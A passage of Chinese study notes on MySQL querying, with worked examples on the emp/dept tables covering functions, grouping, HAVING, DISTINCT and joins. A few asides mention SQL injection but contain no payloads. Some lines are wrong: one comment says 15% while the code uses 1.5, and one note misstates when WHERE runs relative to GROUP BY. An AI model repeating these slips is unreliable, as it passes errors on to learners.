asc;#sal在前起主导，sal相等时才比较ename<br></code></pre></td></tr></table></figure><p>根据字段位置排序(sql注入常用)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename,sal from emp order by 2;#2表示第二列<br></code></pre></td></tr></table></figure><p><strong>数据处理函数：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mysql">Lower()#转换小写<br>Upper()#转换大写<br>******Substr()#取子串(sub(string,start,length))<br>******Length()#取长度<br>Trim()#去空格<br>str_to_date()#将字符串转化成日期<br>data_format()#格式化日期<br>format()#设置千分位<br>round()#四舍五入，用法：round(待变值，保留小数位)<br>rand()#生成随机数<br>******concat()#字符串拼接，而不能用加号<br>ifnull()#将null赋予值，ifnull(数据，被当做哪个值)，如果数据是null,将数据当做哪个值<br></code></pre></td></tr></table></figure><p><em><strong>substr()起始下标从1开始而不是0！</strong></em></p><p>找出员工名字第一个字母是A的员工信息？</p><p>两种方法：</p><ol><li><code>select ename from emp where ename like &#39;A%&#39;;</code></li><li><code>select ename from emp where substr(ename,1,1)=&#39;A&#39;;</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mysql"> select ename,sal + comm as salcomm from emp;#数据库中有null参与的数据运算结果都为null<br>+--------+---------+<br>| ename  | salcomm |<br>+--------+---------+<br>| SMITH  |    NULL |<br>| ALLEN  | 1900.00 |<br>| WARD   | 1750.00 |<br>| JONES  |    NULL |<br>| MARTIN | 2650.00 |<br>| BLAKE  |    NULL |<br>| CLARK  |    NULL |<br>| SCOTT  |    NULL |<br>| KING   |    NULL |<br>| TURNER | 1500.00 |<br>| ADAMS  |    NULL |<br>| JAMES  |    NULL |<br>| FORD   |    NULL |<br>| MILLER |    NULL |<br>+--------+---------+<br></code></pre></td></tr></table></figure><p>ifnull()的用途：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename,sal + ifnull(comm,0) as salcomm from emp;<br>+--------+---------+<br>| ename  | salcomm |<br>+--------+---------+<br>| SMITH  |  800.00 |<br>| ALLEN  | 1900.00 |<br>| WARD   | 1750.00 |<br>| JONES  | 2975.00 |<br>| MARTIN | 2650.00 |<br>| BLAKE  | 2850.00 |<br>| CLARK  | 2450.00 |<br>| SCOTT  | 3000.00 |<br>| KING   | 5000.00 |<br>| TURNER | 1500.00 |<br>| ADAMS  | 1100.00 |<br>| JAMES  |  950.00 |<br>| FORD   | 3000.00 |<br>| MILLER | 1300.00 |<br>+--------+---------+<br></code></pre></td></tr></table></figure><p><code>case...when...then...when...then...else...end</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#eg:当员工工作岗位是MANAGER时工资上调10%，当员工工作岗位是SALESMAN时工资上调15%，其他正常<br> select ename,job,sal as oldsal,(case job when &#x27;MANAGER&#x27; then sal*1.1 when &#x27;SALESMAN&#x27; then sal*1.5 else sal end) as newsal from emp;<br>+--------+-----------+---------+---------+<br>| ename  | job       | oldsal  | newsal  |<br>+--------+-----------+---------+---------+<br>| SMITH  | CLERK     |  800.00 |  800.00 |<br>| ALLEN  | SALESMAN  | 1600.00 | 2400.00 |<br>| WARD   | SALESMAN  | 1250.00 | 1875.00 |<br>| JONES  | MANAGER   | 2975.00 | 3272.50 |<br>| MARTIN | SALESMAN  | 1250.00 | 1875.00 |<br>| BLAKE  | MANAGER   | 2850.00 | 3135.00 |<br>| CLARK  | MANAGER   | 2450.00 | 2695.00 |<br>| SCOTT  | ANALYST   | 3000.00 | 3000.00 |<br>| KING   | PRESIDENT | 5000.00 | 5000.00 |<br>| TURNER | SALESMAN  | 1500.00 | 2250.00 |<br>| ADAMS  | CLERK     | 1100.00 | 1100.00 |<br>| JAMES  | CLERK     |  950.00 |  950.00 |<br>| FORD   | ANALYST   | 3000.00 | 3000.00 |<br>| MILLER | CLERK     | 1300.00 | 1300.00 |<br>+--------+-----------+---------+---------+<br></code></pre></td></tr></table></figure><h4 id="7-11"><a href="#7-11" class="headerlink" title="7.11"></a>7.11</h4><p> <strong>分组函数：</strong></p><p>输入多行，输出一行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">count()#计数，count(*)表示统计所有行数，count(具体字段)代表统计该字段下不为null的<br>sum()#求和<br>avg()#平均值<br>max()#最大值<br>min()#最小值<br></code></pre></td></tr></table></figure><p>分组函数自动忽略null，不需要对null进行处理</p><p>分组函数在使用时必须分组，没分组默认整张表是一组</p><p>分组函数不能直接使用在where语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename,sal from emp where sal &gt; min(sal);#表面上没问题<br>ERROR 1111 (HY000): Invalid use of group function<br>#实际报错，无效使用分组函数<br>#为什么？分组查询(group by)<br>#分组函数在使用时必须先分组，但是WHERE语句在执行时排在GROUP BY后面，此时还没分组<br>#为什么select sum(sal) from emp;不用分组也能用呢？<br>#因为执行顺序<br>#from,where,group by,select,order by，select在group by之后执行<br></code></pre></td></tr></table></figure><p><strong>分组查询：(SQL注入常用)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#找出每个工作岗位的工资和？<br>#思路：按工作岗位分组，对工资求和<br>select job,sum(sal) from emp group by job;<br>+-----------+----------+<br>| job       | sum(sal) |<br>+-----------+----------+<br>| ANALYST   |  6000.00 |<br>| CLERK     |  4150.00 |<br>| MANAGER   |  8275.00 |<br>| PRESIDENT |  5000.00 |<br>| SALESMAN  |  5600.00 |<br>+-----------+----------+<br></code></pre></td></tr></table></figure><p>在一条SELECT语句中如果有GROUP BY，SELECT后面只能跟参加分组的字段和分组函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename,sal,deptno from emp;#先查一下表，可以看到10部门中最高工资是KING，20部门中最高工资是FORD和SCOTT，30部门中最高工资是BLAKE<br>+--------+---------+--------+<br>| ename  | sal     | deptno |<br>+--------+---------+--------+<br>| SMITH  |  800.00 |     20 |<br>| ALLEN  | 1600.00 |     30 |<br>| WARD   | 1250.00 |     30 |<br>| JONES  | 2975.00 |     20 |<br>| MARTIN | 1250.00 |     30 |<br>| BLAKE  | 2850.00 |     30 |<br>| CLARK  | 2450.00 |     10 |<br>| SCOTT  | 3000.00 |     20 |<br>| KING   | 5000.00 |     10 |<br>| TURNER | 1500.00 |     30 |<br>| ADAMS  | 1100.00 |     20 |<br>| JAMES  |  950.00 |     30 |<br>| FORD   | 3000.00 |     20 |<br>| MILLER | 1300.00 |     10 |<br>+--------+---------+--------+<br>select deptno,max(sal) from emp group by deptno;#查一下每个部门的最高工资<br>+--------+----------+<br>| deptno | max(sal) |<br>+--------+----------+<br>|     10 |  5000.00 |<br>|     20 |  3000.00 |<br>|     30 |  2850.00 |<br>+--------+----------+<br>select ename,deptno,max(sal) from emp group by deptno;#select后加上ename<br>+-------+--------+----------+<br>| ename | deptno | max(sal) |<br>+-------+--------+----------+<br>| CLARK |     10 |  5000.00 |<br>| SMITH |     20 |  3000.00 |<br>| ALLEN |     30 |  2850.00 |<br>+-------+--------+----------+<br>#结果可以看到ename和后面的工资部门信息并不对应，ename无意义，并且Oracle中会报错<br>#如果想实现输出预期结果，需要用到表连接<br></code></pre></td></tr></table></figure><p>按多个字段联合分组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#找出每个部门，不同工作岗位的最高薪资<br>select ename,job,sal,deptno from emp order by deptno;#先查询下按部门分组情况，为便于分析，按部门排序<br>+--------+-----------+---------+--------+<br>| ename  | job       | sal     | deptno |<br>+--------+-----------+---------+--------+<br>| MILLER | CLERK     | 1300.00 |     10 |<br>| KING   | PRESIDENT | 5000.00 |     10 |<br>| CLARK  | MANAGER   | 2450.00 |     10 |<br><br><br>| FORD   | ANALYST   | 3000.00 |     20 |<br>| ADAMS  | CLERK     | 1100.00 |     20 |<br>| SCOTT  | ANALYST   | 3000.00 |     20 |<br>| JONES  | MANAGER   | 2975.00 |     20 |<br>| SMITH  | CLERK     |  800.00 |     20 |<br><br><br>| BLAKE  | MANAGER   | 2850.00 |     30 |<br>| MARTIN | SALESMAN  | 1250.00 |     30 |<br>| TURNER | SALESMAN  | 1500.00 |     30 |<br>| WARD   | SALESMAN  | 1250.00 |     30 |<br>| JAMES  | CLERK     |  950.00 |     30 |<br>| ALLEN  | SALESMAN  | 1600.00 |     30 |<br>+--------+-----------+---------+--------+<br><br>select deptno,job,max(sal) from emp group by deptno,job;#联合分组查询<br>+--------+-----------+----------+<br>| deptno | job       | max(sal) |<br>+--------+-----------+----------+<br>|     10 | CLERK     |  1300.00 |<br>|     10 | MANAGER   |  2450.00 |<br>|     10 | PRESIDENT |  5000.00 |<br>|     20 | ANALYST   |  3000.00 |<br>|     20 | CLERK     |  1100.00 |<br>|     20 | MANAGER   |  2975.00 |<br>|     30 | CLERK     |   950.00 |<br>|     30 | MANAGER   |  2850.00 |<br>|     30 | SALESMAN  |  1600.00 |<br>+--------+-----------+----------+<br></code></pre></td></tr></table></figure><p>如果想对分完组之后的数据进一步过滤，不要用WHERE(参考上面的内容)，而应该用HAVING子句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#eg：找出每个部门最高薪资，要求显示最高薪资大于3000的<br>select deptno,max(sal) from emp group by deptno;#先不考虑要求，查最大薪资<br>+--------+----------+<br>| deptno | max(sal) |<br>+--------+----------+<br>|     10 |  5000.00 |<br>|     20 |  3000.00 |<br>|     30 |  2850.00 |<br>+--------+----------+<br>select deptno,max(sal) from emp group by deptno having max(sal)&gt;3000;#考虑限制要求<br>+--------+----------+<br>| deptno | max(sal) |<br>+--------+----------+<br>|     10 |  5000.00 |<br>+--------+----------+<br>#只有5000被留下来了<br>#having语句要和group by配套使用，不能代替where<br></code></pre></td></tr></table></figure><p>但是上述语句效率相对比较较低，实际上可以这样考虑：</p><p>先将薪资大于3000的用WHERE过滤了，不大于3000的就不进行分组了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select deptno,max(sal) from emp where sal &gt; 3000 group by deptno;<br>+--------+----------+<br>| deptno | max(sal) |<br>+--------+----------+<br>|     10 |  5000.00 |<br>+--------+----------+<br></code></pre></td></tr></table></figure><p>where和having优先选择where，where没办法的再选择having(比如对每个部门平均薪资进行限制的)</p><p><code>distinct</code>关键字：</p><p>把查询结果去除重复记录，注：原表数据不会被修改，只是查询结果去重</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select job from emp;<br>+-----------+<br>| job       |<br>+-----------+<br>| CLERK     |<br>| SALESMAN  |<br>| SALESMAN  |<br>| MANAGER   |<br>| SALESMAN  |<br>| MANAGER   |<br>| MANAGER   |<br>| ANALYST   |<br>| PRESIDENT |<br>| SALESMAN  |<br>| CLERK     |<br>| CLERK     |<br>| ANALYST   |<br>| CLERK     |<br>+-----------+<br>select distinct job from emp;#去重<br>+-----------+<br>| job       |<br>+-----------+<br>| CLERK     |<br>| SALESMAN  |<br>| MANAGER   |<br>| ANALYST   |<br>| PRESIDENT |<br>+-----------+<br></code></pre></td></tr></table></figure><p>distinct只能出现在所有字段的最前方，如果后面有多个字段，则联合去重：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select job,deptno from emp;<br>+-----------+--------+<br>| job       | deptno |<br>+-----------+--------+<br>| CLERK     |     20 |<br>| SALESMAN  |     30 |<br>| SALESMAN  |     30 |<br>| MANAGER   |     20 |<br>| SALESMAN  |     30 |<br>| MANAGER   |     30 |<br>| MANAGER   |     10 |<br>| ANALYST   |     20 |<br>| PRESIDENT |     10 |<br>| SALESMAN  |     30 |<br>| CLERK     |     20 |<br>| CLERK     |     30 |<br>| ANALYST   |     20 |<br>| CLERK     |     10 |<br>+-----------+--------+<br>select distinct job,deptno from emp;<br>+-----------+--------+<br>| job       | deptno |<br>+-----------+--------+<br>| CLERK     |     20 |<br>| SALESMAN  |     30 |<br>| MANAGER   |     20 |<br>| MANAGER   |     30 |<br>| MANAGER   |     10 |<br>| ANALYST   |     20 |<br>| PRESIDENT |     10 |<br>| CLERK     |     30 |<br>| CLERK     |     10 |<br>+-----------+--------+<br></code></pre></td></tr></table></figure><p><strong>连接查询：</strong></p><p>笛卡尔积现象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename from emp;#单独查emp表的ename字段<br>+--------+<br>| ename  |<br>+--------+<br>| SMITH  |<br>| ALLEN  |<br>| WARD   |<br>| JONES  |<br>| MARTIN |<br>| BLAKE  |<br>| CLARK  |<br>| SCOTT  |<br>| KING   |<br>| TURNER |<br>| ADAMS  |<br>| JAMES  |<br>| FORD   |<br>| MILLER |<br>+--------+<br>select dname from dept;#单独查dept表的dname字段<br>+------------+<br>| dname      |<br>+------------+<br>| ACCOUNTING |<br>| RESEARCH   |<br>| SALES      |<br>| OPERATIONS |<br>+------------+<br>select ename,dname from emp,dept;#对两张表进行连接查询，没有任何限制的时候，查询结果条数是两个表条数的乘积<br>+--------+------------+<br>| ename  | dname      |<br>+--------+------------+<br>| SMITH  | ACCOUNTING |<br>| SMITH  | RESEARCH   |<br>| SMITH  | SALES      |<br>| SMITH  | OPERATIONS |<br>| ALLEN  | ACCOUNTING |<br>| ALLEN  | RESEARCH   |<br>| ALLEN  | SALES      |<br>| ALLEN  | OPERATIONS |<br>| WARD   | ACCOUNTING |<br>| WARD   | RESEARCH   |<br>| WARD   | SALES      |<br>| WARD   | OPERATIONS |<br>| JONES  | ACCOUNTING |<br>| JONES  | RESEARCH   |<br>| JONES  | SALES      |<br>| JONES  | OPERATIONS |<br>| MARTIN | ACCOUNTING |<br>| MARTIN | RESEARCH   |<br>| MARTIN | SALES      |<br>| MARTIN | OPERATIONS |<br>| BLAKE  | ACCOUNTING |<br>| BLAKE  | RESEARCH   |<br>| BLAKE  | SALES      |<br>| BLAKE  | OPERATIONS |<br>| CLARK  | ACCOUNTING |<br>| CLARK  | RESEARCH   |<br>| CLARK  | SALES      |<br>| CLARK  | OPERATIONS |<br>| SCOTT  | ACCOUNTING |<br>| SCOTT  | RESEARCH   |<br>| SCOTT  | SALES      |<br>| SCOTT  | OPERATIONS |<br>| KING   | ACCOUNTING |<br>| KING   | RESEARCH   |<br>| KING   | SALES      |<br>| KING   | OPERATIONS |<br>| TURNER | ACCOUNTING |<br>| TURNER | RESEARCH   |<br>| TURNER | SALES      |<br>| TURNER | OPERATIONS |<br>| ADAMS  | ACCOUNTING |<br>| ADAMS  | RESEARCH   |<br>| ADAMS  | SALES      |<br>| ADAMS  | OPERATIONS |<br>| JAMES  | ACCOUNTING |<br>| JAMES  | RESEARCH   |<br>| JAMES  | SALES      |<br>| JAMES  | OPERATIONS |<br>| FORD   | ACCOUNTING |<br>| FORD   | RESEARCH   |<br>| FORD   | SALES      |<br>| FORD   | OPERATIONS |<br>| MILLER | ACCOUNTING |<br>| MILLER | RESEARCH   |<br>| MILLER | SALES      |<br>| MILLER | OPERATIONS |<br>+--------+------------+<br></code></pre></td></tr></table></figure><p>加限制条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select emp.ename,dept.dname from emp,dept where emp.deptno = dept.deptno order by dname;#只有emp中的deptno和dept中的deptno相等时<br>+--------+------------+<br>| ename  | dname      |<br>+--------+------------+<br>| CLARK  | ACCOUNTING |<br>| KING   | ACCOUNTING |<br>| MILLER | ACCOUNTING |<br>| SCOTT  | RESEARCH   |<br>| FORD   | RESEARCH   |<br>| SMITH  | RESEARCH   |<br>| ADAMS  | RESEARCH   |<br>| JONES  | RESEARCH   |<br>| ALLEN  | SALES      |<br>| JAMES  | SALES      |<br>| MARTIN | SALES      |<br>| TURNER | SALES      |<br>| WARD   | SALES      |<br>| BLAKE  | SALES      |<br>+--------+------------+<br>#最终查询结果减少了，但是匹配次数没减少，还是4*14=56条<br>#&#x27;select emp.ename,dept.dname from&#x27;部分如果换成&#x27;select ename,dname from&#x27;效率降低，因为虽然dept表中没有ename字段，但是MySQL还是会去找，emp和dname同理，而且逻辑上不够严谨<br>select e.ename,d.dname from emp as e,dept as d where e.deptno = d.deptno order by dname;<br>#给表起别名很重要，提高效率<br></code></pre></td></tr></table></figure><ul><li>内连接<ul><li>等值连接</li><li>非等值连接</li><li>自连接</li></ul></li><li>外连接<ul><li>左外连接(左连接)</li><li>右外连接(右连接)</li></ul></li></ul><p>内连接——等值连接</p><p>上述笛卡尔积现象SQL语句是SQL92语法，SQL99语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select e.ename,d.dname from emp e join dept d on e.deptno = d.deptno order by dname;<br>+--------+------------+<br>| ename  | dname      |<br>+--------+------------+<br>| CLARK  | ACCOUNTING |<br>| KING   | ACCOUNTING |<br>| MILLER | ACCOUNTING |<br>| SCOTT  | RESEARCH   |<br>| FORD   | RESEARCH   |<br>| SMITH  | RESEARCH   |<br>| ADAMS  | RESEARCH   |<br>| JONES  | RESEARCH   |<br>| ALLEN  | SALES      |<br>| JAMES  | SALES      |<br>| MARTIN | SALES      |<br>| TURNER | SALES      |<br>| WARD   | SALES      |<br>| BLAKE  | SALES      |<br>+--------+------------+<br>#实现了外连接与后续where语句的分离，结构更清晰<br>#SQL99语法：<br>SELECT<br>...<br>FROM<br>A<br>JOIN #其实join前面省略了个inner，代表内连接，可省，但是保留可读性更好<br>B<br>ON<br>A和B的连接条件 #如果是等量关系就称为等值连接<br>WHERE<br>筛选条件<br></code></pre></td></tr></table></figure><p>内连接——非等值连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#eg：找出每个员工的薪资等级，要求显示员工名、薪资、薪资等级<br>select * from salgrade;#先看下薪资表<br>+-------+-------+-------+<br>| GRADE | LOSAL | HISAL |<br>+-------+-------+-------+<br>|     1 |   700 |  1200 |<br>|     2 |  1201 |  1400 |<br>|     3 |  1401 |  2000 |<br>|     4 |  2001 |  3000 |<br>|     5 |  3001 |  9999 |<br>+-------+-------+-------+<br>select e.ename,e.sal,s.grade from emp as e join salgrade as s on e.sal between s.losal and s.hisal;<br>+--------+---------+-------+<br>| ename  | sal     | grade |<br>+--------+---------+-------+<br>| SMITH  |  800.00 |     1 |<br>| ALLEN  | 1600.00 |     3 |<br>| WARD   | 1250.00 |     2 |<br>| JONES  | 2975.00 |     4 |<br>| MARTIN | 1250.00 |     2 |<br>| BLAKE  | 2850.00 |     4 |<br>| CLARK  | 2450.00 |     4 |<br>| SCOTT  | 3000.00 |     4 |<br>| KING   | 5000.00 |     5 |<br>| TURNER | 1500.00 |     3 |<br>| ADAMS  | 1100.00 |     1 |<br>| JAMES  |  950.00 |     1 |<br>| FORD   | 3000.00 |     4 |<br>| MILLER | 1300.00 |     2 |<br>+--------+---------+-------+<br></code></pre></td></tr></table></figure><p>内连接——自连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 